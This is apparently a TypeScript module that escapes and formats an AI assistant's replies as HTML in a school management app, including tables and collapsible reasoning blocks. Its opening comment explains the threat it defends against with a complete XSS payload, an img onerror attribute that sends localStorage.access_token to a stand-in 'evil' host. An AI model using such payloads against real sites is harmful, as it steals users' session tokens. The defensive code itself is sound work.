/**
 * Rendering for AI assistant replies.
 *
 * Extracted from AltrixCopilot so the escaping rules can be tested: this is
 * the only place model output becomes HTML, and its input is not trustworthy.
 */

/**
 * Escape every character that could start markup.
 *
 * The model's reply is rendered with dangerouslySetInnerHTML, and its context is
 * built from school data — student names, message bodies, notice text — which
 * users control. Without this, a pupil named
 * `<img src=x onerror="fetch('//evil/'+localStorage.access_token)">` runs script
 * in the browser of every staff member who asks the assistant about them, and
 * the JWT lives in localStorage.
 *
 * Escaping happens before any formatting, so the only HTML in the output is the
 * markup this function adds itself.
 */
export function escapeHtml(value: string): string {
  return value
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}

export function renderMarkdown(text: string): string {
  if (!text || typeof text !== "string") return "";

  // Escape first. Everything below either strips text or inserts markup that
  // this function controls; nothing re-introduces caller-supplied HTML.
  // NUL is removed before anything else: it marks the table placeholders
  // below, and a reply must not be able to forge one.
  let formatted = escapeHtml(text.replace(/\u0000/g, ""));

  // Strip any action tags or internal protocol tags. These are matched in their
  // escaped form because escaping already ran.
  formatted = formatted.replace(/&lt;altrix_action&gt;[\s\S]*?&lt;\/altrix_action&gt;/gi, "");
  formatted = formatted.replace(/&lt;altrix_chart[\s\S]*?\/&gt;/gi, "");

  // Strip raw database UUIDs (e.g., 8ea67280-cd68-45fa-bb2a-fa67623910c2)
  const uuidPattern = /[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/gi;
  formatted = formatted.replace(uuidPattern, "");

  // Strip bracketed ID expressions like [ID: ...], [Student ID: ...], or (User ID: ...)
  const bracketedIdPattern = /[\[\(][^\]\)]*\bid\b[^\]\)]*[\]\)]/gi;
  formatted = formatted.replace(bracketedIdPattern, "");

  // Strip markdown links [Label](url) -> Label (clean text, no clickable links)
  formatted = formatted.replace(/\[([^\]]+)\]\([^\)]+\)/g, "$1");

  // Strip raw URLs
  formatted = formatted.replace(/https?:\/\/[^\s]+/g, "");
  
  // Handle <think>...</think> block beautifully for reasoning models.
  // Matched in escaped form, since escaping has already run.
  if (formatted.includes("&lt;think&gt;")) {
    if (formatted.includes("&lt;/think&gt;")) {
      formatted = formatted.replace(
        /&lt;think&gt;([\s\S]*?)&lt;\/think&gt;/g,
        '<details class="mb-3 border border-slate-200 rounded-xl bg-slate-50/50 overflow-hidden"><summary class="px-3 py-2 text-[10px] font-semibold text-slate-500 cursor-pointer hover:bg-slate-100 select-none flex items-center gap-1.5">🧠 Thought Process (click to expand)</summary><div class="px-3 pb-3 pt-1 text-[11px] text-slate-500 border-t border-slate-100 bg-white/50 whitespace-pre-wrap leading-relaxed">$1</div></details>'
      );
    } else {
      // Still thinking (unclosed tag during streaming)
      const parts = formatted.split("&lt;think&gt;");
      const beforeThink = parts[0];
      const thinkingContent = parts[1] || "";
      formatted = beforeThink + `<details open class="mb-3 border border-slate-200 rounded-xl bg-slate-50/50 overflow-hidden"><summary class="px-3 py-2 text-[10px] font-semibold text-slate-500 cursor-pointer hover:bg-slate-100 select-none flex items-center gap-1.5">🧠 Thinking...</summary><div class="px-3 pb-3 pt-1 text-[11px] text-slate-500 border-t border-slate-100 bg-white/50 whitespace-pre-wrap leading-relaxed">${thinkingContent}</div></details>`;
    }
  }

  // Tables are lifted out first and put back last, so the line-based rules
  // below (lists, headings, newlines to <br/>) never touch their markup.
  const tables: string[] = [];
  formatted = extractTables(formatted, tables);

  formatted = inline(formatted)
    // Bullet points
    .replace(/^- (.+)$/gm, '<li class="ml-3 list-disc list-outside">$1</li>')
    // Numbered list
    .replace(/^\d+\. (.+)$/gm, '<li class="ml-3 list-decimal list-outside">$1</li>')
    // Headers
    .replace(/^### (.+)$/gm, '<p class="font-bold text-primary mt-2 mb-1 text-[11px] uppercase tracking-wide">$1</p>')
    .replace(/^## (.+)$/gm, '<p class="font-bold text-slate-800 mt-2 mb-1 text-[12px]">$1</p>')
    .replace(/^# (.+)$/gm, '<p class="font-bold text-slate-900 mt-2 mb-1 text-[13px]">$1</p>')
    // Newlines
    .replace(/\n\n/g, '<br/><br/>')
    .replace(/\n/g, '<br/>');

  return formatted.replace(/\u0000T(\d+)\u0000(<br\/>)*/g, (_m, i) => tables[Number(i)] ?? "");
}

/** Bold, italic and code inside one run of already-escaped text. */
function inline(text: string): string {
  return text
    .replace(/\*\*(.+?)\*\*/g, "<strong>$1</strong>")
    .replace(/\*(.+?)\*/g, "<em>$1</em>")
    // _italic_ — only as a whole word, so snake_case names are left alone.
    .replace(/(^|[\s(])_([^_\n]+?)_(?=$|[\s.,;:!?)])/gm, "$1<em>$2</em>")
    .replace(/`(.+?)`/g, '<code class="bg-slate-100 text-primary px-1 rounded text-[10px]">$1</code>');
}

const isRow = (line: string) => /^\s*\|.*\|\s*$/.test(line);
const isSeparator = (line: string) => /^\s*\|(\s*:?-{3,}:?\s*\|)+\s*$/.test(line);
const cellsOf = (line: string) => line.trim().replace(/^\||\|$/g, "").split("|").map((c) => c.trim());
/** Figures read better right-aligned: amounts, counts, percentages, dates. */
const looksNumeric = (cell: string) => /^(Rs\.|PKR|-?\d)[\d,.\s%:–-]*/.test(cell) && !/[a-z]{3,}/i.test(cell.replace(/^(Rs\.|PKR)/, ""));

/**
 * Markdown tables to HTML.
 *
 * The Copilot's answers from the school's records are tables — invoices,
 * attendance, results — and this renderer used to print them as rows of raw
 * pipe characters. Cells are already escaped by the time they get here.
 */
function extractTables(text: string, store: string[]): string {
  const lines = text.split("\n");
  const out: string[] = [];
  for (let i = 0; i < lines.length; i += 1) {
    if (isRow(lines[i]) && i + 1 < lines.length && isSeparator(lines[i + 1])) {
      const header = cellsOf(lines[i]);
      const body: string[][] = [];
      i += 2;
      while (i < lines.length && isRow(lines[i])) {
        body.push(cellsOf(lines[i]));
        i += 1;
      }
      i -= 1;
      const numeric = header.map((_, c) => body.length > 0 && body.every((r) => !r[c] || r[c] === "—" || looksNumeric(r[c])));
      const th = header
        .map((h, c) => `<th class="px-2 py-1.5 font-semibold text-slate-600 whitespace-nowrap border-b border-slate-200 ${numeric[c] ? "text-right" : "text-left"}">${inline(h)}</th>`)
        .join("");
      const rows = body
        .map((r) => `<tr class="odd:bg-white even:bg-slate-50/60">${header
          .map((_, c) => `<td class="px-2 py-1.5 text-slate-700 whitespace-nowrap border-b border-slate-100 ${numeric[c] ? "text-right tabular-nums" : ""}">${inline(r[c] ?? "")}</td>`)
          .join("")}</tr>`)
        .join("");
      store.push(
        `<div class="my-2 max-w-full overflow-x-auto rounded-xl border border-slate-200 bg-white"><table class="w-full border-collapse text-[11px]"><thead class="bg-slate-50"><tr>${th}</tr></thead><tbody>${rows}</tbody></table></div>`,
      );
      out.push(`\u0000T${store.length - 1}\u0000`);
      continue;
    }
    out.push(lines[i]);
  }
  return out.join("\n");
}
